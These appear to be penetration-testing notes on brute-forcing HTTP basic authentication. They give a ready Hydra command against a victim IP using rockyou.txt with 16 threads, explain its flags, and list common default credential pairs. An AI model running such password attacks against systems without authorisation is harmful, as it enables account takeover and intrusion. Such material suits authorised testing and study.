> basic auth

```bash
hydra -L $WORDLIST_PATH/usernames.txt -P $WORDLIST_PATH/rockyou.txt $VICTIM_IP http-get / -s 40064 -f -t 16 -V
```
- `-l` = login name
- `-L` = list of usernames
- `-P` = password list
- `-s` = port
- `http-get` = attack module
- `-f` = stop on first found
- `-t 16` = 16 threads
- `-V` = verbose output


Common Passwords:

```bash
```shell-session
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```
```